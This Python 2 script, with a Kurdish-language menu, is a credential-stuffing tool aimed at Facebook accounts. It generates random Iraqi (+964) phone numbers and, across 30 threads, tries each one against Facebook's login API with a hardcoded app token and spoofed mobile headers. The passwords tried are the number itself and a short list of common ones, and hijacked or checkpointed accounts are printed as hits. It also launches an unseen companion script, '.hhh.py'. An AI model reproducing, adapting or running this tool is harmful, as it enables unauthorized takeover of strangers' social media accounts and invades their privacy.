import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, time
os.system('rm -rf .txt')
for n in range(8310):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)




def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)


hala = '  \x1b[31;1m 1\x1b[0;1m - La Regay Xera Ba ( \x1b[34mkorak \x1b[0;1m,\x1b[33;1m TP-Link\x1b[0;1m )\n\n  \x1b[31;1m 2 \x1b[0;1m- La Regay Kamek Xaw\n        Ba Be Check Point ( \x1b[34mkorak\x1b[0;1m ,\x1b[33;1m TP-Link \x1b[0;1m)\n\n \x1b[31;1m  0 \x1b[0;1m- Darchwn la\x1b[31;1m Program\x1b[0;1m'

def t():
    os.system('clear')


def cb():
    os.system('clear')


back = 0
successful = []
cpb = []
oks = []
id = []
os.system('clear')

def menu():
    os.system('clear')

    time.sleep(2)
    print '\x1b[32m.'
    os.system('clear')
    os.system('figlet YY HAMA YY')
    print '\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
    print 'INTAGRAM: yy_hama_yy'
    print '\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
    print hala
    print '\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
    action()


def action():
    bch = raw_input(' Hall Bzhera : ')
    if bch == '1':
        os.system('python2 .hhh.py')
        print ' halaya !'
        action()
    elif bch == '1':
        os.system('python2 .hhh.py')
    elif bch == '2':
        os.system('clear')
        print '\x1b[32m.'
        os.system('clear')
        os.system('figlet YY HAMA YY')
        print '\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
        print '\x1b[32m 770-771-772-773-774\n  750-751-752-753-754\n   780-781-782-783-784\x1b[0;1m\n\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
        try:
            k = '+964'
            c = raw_input('\x1b[90;1m Saratakay chi bet : ')
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '!'
            raw_input('\n[ Garanawa ]')
            menu()

    elif bch == '13':
        login()
    elif bch == '0':
        exb()
    else:
        print '!'
        action()
    xxx = str(len(id))
    psb('\x1b[31mHamw Zhmara Kan: ' + xxx)
    print ' Created by YY HAMA YY\n\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'

    def main(arg):
        user = arg
        try:
            time.sleep(0.1)
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;32;40m[OK]\x1b[0m Number: ' + k + c + user + ' PASS: ' + pass1
            elif 'free.facebook.com' in q['error_msg']:
                print '[\x1b[31mCP\x1b[0;1m] Number: ' + k + c + user + ' PASS: ' + pass1
            else:
                pass2 = '1234512345'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;32;40m[OK]\x1b[0m Number: ' + k + c + user + ' PASS: ' + pass2
                elif 'free.facebook.com' in q['error_msg']:
                    print '[\x1b[31mCP\x1b[0;1m] Number: ' + k + c + user + ' PASS: ' + pass2
                else:
                    pass3 = '1122334455'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;32;40m[OK]\x1b[0m Number: ' + k + c + user + ' PASS: ' + pass3
                    elif 'free.facebook.com' in q['error_msg']:
                        print '[\x1b[31mCP\x1b[0;1m] Number: ' + k + c + user + ' PASS: ' + pass3
                    else:
                        pass4 = '123456123456'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;32;40m[OK]\x1b[0m Number: ' + k + c + user + ' PASS: ' + pass4
                        elif 'free.facebook.com' in q['error_msg']:
                            print '[\x1b[31mCP\x1b[0;1m] Number: ' + k + c + user + ' PASS: ' + pass4
                        else:
                            pass5 = '123454321'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;32;40m[OK]\x1b[0m Number: ' + k + c + user + ' PASS: ' + pass5
                            elif 'free.facebook.com' in q['error_msg']:
                                print '[\x1b[31mCP\x1b[0;1m] Number: ' + k + c + user + ' PASS: ' + pass5
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '         '
    print 'Tawaw Bw ....'
    raw_input('\n[Enter Bka Bo Darchwn]')
    os.sys.exit()

if __name__ == '__main__':
    menu()
